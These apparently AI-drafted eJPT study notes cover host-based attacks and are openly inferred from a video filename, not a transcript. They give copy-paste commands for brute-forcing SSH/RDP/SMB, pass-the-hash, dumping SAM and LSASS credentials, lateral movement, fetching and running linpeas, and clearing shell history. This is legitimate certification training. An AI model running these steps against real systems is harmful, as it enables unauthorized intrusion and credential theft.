# Host Based Attacks (eJPT) — Study Notes

Note: The transcript for “Host Based Attacks.mp4” was not provided. The following summary is inferred from the filename and typical eJPT coverage in an “Introduction to System” context. Commands and flows are conservative, common, and exam-relevant.

## What the video covers (Introduction / big picture)
- What “host-based attacks” are: targeting a specific system (Windows/Linux) via exposed services and local weaknesses (vs. pure network/web attacks).
- Common attack surfaces: SSH, RDP, SMB/Windows Admin Shares, FTP, WinRM, remote service auth.
- The typical flow after initial access: local enumeration → privilege escalation → credential dumping → lateral movement → persistence → cleanup.
- Tooling you’re expected to know: nmap, Hydra/Ncrack, enum4linux/smbclient/smbmap, Impacket (psexec/wmiexec/secretsdump), Metasploit login scanners, Evil-WinRM, linpeas/winpeas, basic OS commands.

## Flow (ordered)
1. Recon the target host and identify services (nmap).
2. Enumerate services for misconfigurations and anonymous/guest access (SMB/FTP).
3. Attempt credential discovery (default creds, password spraying/brute, credential reuse).
4. Gain remote access (SSH/RDP/SMB exec/WinRM).
5. Post-exploitation local enumeration (OS, users, services, privileges, weak perms).
6. Privilege escalation (SUID/capabilities/sudo on Linux; misconfigs/tokens/services on Windows).
7. Credential dumping and session creds (SAM/LSASS on Windows; readable secrets on Linux).
8. Lateral movement with harvested credentials/hashes.
9. Persistence (scheduled tasks/cron/keys) and logging/cleanup.

## Tools highlighted
- Scanning/Enumeration: nmap, enum4linux, smbclient, smbmap, crackmapexec (for SMB spray), Metasploit auxiliary scanners.
- Brute-force/Spraying: Hydra (SSH/FTP), Ncrack (RDP), Medusa (alt), Metasploit ssh_login/smb_login.
- Remote execution/Access: SSH, Evil-WinRM, Impacket (psexec.py, wmiexec.py, smbexec.py), PSExec (Sysinternals), winexe.
- Credential dumping: Impacket secretsdump.py, reg save (Windows hives), Mimikatz (if allowed).
- Local enumeration: linpeas.sh, winPEAS.exe, manual OS commands.
- Cracking: John the Ripper, hashcat (offline).

## Typical command walkthrough (detailed, copy-paste friendly)

Set handy variables:
```bash
export TARGET=10.10.10.10
export DOMAIN=WORKGROUP
export USER=Administrator
export PASS='Password123!'
mkdir -p nmap loot
```

1) Scan and identify host services
```bash
# Common host services in scope for eJPT
nmap -Pn -sC -sV -p 21,22,80,135,139,445,3389,5985 -oN nmap/$TARGET.txt $TARGET

# If you want a fuller top-ports sweep
nmap -Pn -sC -sV --top-ports 1000 -oN nmap/${TARGET}_top1000.txt $TARGET
```

2) SMB enumeration (Windows targets)
```bash
# List shares anonymously
smbclient -L //$TARGET -N

# Enumerate users/shares/policies
enum4linux -a $TARGET | tee loot/${TARGET}_enum4linux.txt

# Quick SMB share perms map (try anonymous and guessed creds)
smbmap -H $TARGET -u '' -p '' | tee loot/${TARGET}_smbmap_anon.txt
smbmap -H $TARGET -u guest -p '' | tee -a loot/${TARGET}_smbmap_guest.txt

# Connect to a found share
smbclient //$TARGET/share -N
```

3) Credential attacks (be mindful of lockout policies)
```bash
# SSH brute (slow and careful)
hydra -L users.txt -P passwords.txt -t 4 -f ssh://$TARGET

# FTP brute (if ftp open)
hydra -L users.txt -P passwords.txt -t 4 -f ftp://$TARGET

# RDP brute (Ncrack tends to be more reliable for RDP)
ncrack -vv -U users.txt -P passwords.txt rdp://$TARGET

# SMB spraying (if allowed in lab; great for quick wins)
crackmapexec smb $TARGET -u users.txt -p passwords.txt --continue-on-success | tee loot/${TARGET}_cme_spray.txt
```

Metasploit login scanners (alternative):
```text
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $TARGET
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run

use auxiliary/scanner/smb/smb_login
set RHOSTS $TARGET
set SMBUser Administrator
set PASS_FILE passwords.txt
run
```

4) Remote access using found creds
```bash
# SSH (Linux)
ssh user@$TARGET

# WinRM (Windows, requires TCP 5985/5986)
evil-winrm -i $TARGET -u $USER -p "$PASS"

# Impacket SMB/Remote exec (Windows)
impacket-psexec ${DOMAIN}/${USER}:"$PASS"@${TARGET}
# or if using hashes (LM:NT). If LM unknown, use :NT only.
impacket-psexec ${DOMAIN}/${USER}@${TARGET} -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# WMI-based semi-interactive shell
impacket-wmiexec ${DOMAIN}/${USER}:"$PASS"@${TARGET}
```

5) Local enumeration — Linux
```bash
# Quick baseline
id
uname -a
lsb_release -a 2>/dev/null
whoami; sudo -l
cat /etc/os-release

# Interesting files/permissions
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
grep -Rin "password|passwd|secret|token" /etc 2>/dev/null | head
ls -la /etc/sudoers* /etc/sudoers.d 2>/dev/null
ss -tulpn

# Automated helper (linpeas)
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.out
```

6) Local enumeration — Windows
```cmd
whoami /all
systeminfo
hostname && ver
net user
net localgroup administrators
wmic qfe get HotFixID,InstalledOn,Description
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
schtasks /query /fo LIST /v | findstr /i "TaskName\|Author\|Run As\|Next Run Time"
ipconfig /all
netstat -ano

REM Automated helper (winPEAS) - after uploading winPEAS.exe
winPEAS.exe > C:\Windows\Temp\winpeas.txt
```

7) Privilege escalation hints
- Linux:
```bash
sudo -l
find / -writable -type d 2>/dev/null | head
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
# Check cron/systemd service files, PATH hijacks, NFS no_root_squash, Docker/LXD group
```
- Windows:
```cmd
whoami /priv
icacls "C:\Program Files\SomeService\service.exe"
sc qc <ServiceName>
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\System\CurrentControlSet\Services\<ServiceName> /s
REM Look for unquoted service paths, weak service/file perms, AlwaysInstallElevated, token privileges (SeImpersonate), and scheduled tasks.
```

8) Credential dumping (Windows)
```cmd
REM Save registry hives (requires admin)
reg save HKLM\SAM C:\Windows\Temp\SAM.save
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.save
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.save
```
Download those files to your attack box, then:
```bash
secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
# Or dump remotely if you have admin creds
secretsdump.py ${DOMAIN}/${USER}:"$PASS"@${TARGET}
```

Mimikatz (often AV-detected; use only if allowed)
```text
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
```

9) Lateral movement examples
```bash
# Reuse found plaintext passwords or NTLM hashes
crackmapexec smb 10.10.10.0/24 -u 'Administrator' -H 31d6cfe0d16ae931b73c59d7e0c089c0 --continue-on-success
impacket-wmiexec ${DOMAIN}/Administrator@10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

10) Persistence and cleanup (lab hygiene)
```cmd
REM Windows cleanup examples
del C:\Windows\Temp\SAM.save C:\Windows\Temp\SYSTEM.save C:\Windows\Temp\SECURITY.save
del C:\Windows\Temp\winpeas.txt

# Linux cleanup examples
rm -f /tmp/linpeas.sh /tmp/linpeas.out
history -c
```

## Practical tips
- Respect account lockout policies. Prefer spraying small, high-probability passwords with delays over aggressive brute-force.
- Verify service reachability before brute forcing (e.g., test SSH banner or RDP availability).
- Start with anonymous/guest checks (SMB/FTP). Free access saves time and noise.
- Use -f/STOP_ON_SUCCESS to stop after the first hit to limit noise.
- With SMB/WinRM, prefer Impacket/Evil-WinRM for reliability and clear error messages.
- If AV blocks Mimikatz, use Impacket secretsdump with registry hive saves; it’s often less noisy.
- Record everything (tee to files) to avoid repeating noisy scans.
- On Windows, look for unquoted service paths and weak service binary permissions; on Linux, look for SUID binaries and sudo misconfigs first.
- Clean up artifacts in labs; delete uploaded tools/logs.

## Minimal cheat sheet (one-screen flow)
```bash
# 1) Scan
export TARGET=10.10.10.10; nmap -Pn -sC -sV -p 22,139,445,3389,5985 $TARGET

# 2) SMB enum
smbclient -L //$TARGET -N
enum4linux -a $TARGET
smbmap -H $TARGET -u '' -p ''

# 3) Cred attacks
hydra -L users.txt -P passwords.txt ssh://$TARGET -t 4 -f
ncrack -vv -U users.txt -P passwords.txt rdp://$TARGET
crackmapexec smb $TARGET -u users.txt -p passwords.txt --continue-on-success

# 4) Remote access
ssh user@$TARGET
evil-winrm -i $TARGET -u Administrator -p 'Password123!'
impacket-psexec WORKGROUP/Administrator:'Password123!'@$TARGET

# 5) Local enum (Linux/Windows)
id; uname -a; sudo -l; find / -perm -4000 -type f 2>/dev/null
whoami /all & systeminfo & net localgroup administrators

# 6) Cred dump (Windows)
reg save HKLM\SAM C:\Windows\Temp\SAM.save
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.save
secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL
```

## Summary
- Host-based attacks focus on breaking into and escalating within a specific machine by abusing exposed services and local misconfigurations.
- The core eJPT-ready workflow is: identify services → enumerate → obtain creds (brute/spray/guess/anon) → get a shell → perform local enumeration → escalate privileges → dump credentials → pivot/lateral move → maintain access and clean up.
- Mastering a small set of reliable tools (nmap, enum4linux/smbmap/smbclient, Hydra/Ncrack, Impacket, Evil-WinRM, linpeas/winPEAS) and the associated command flags is enough to be effective in the exam context.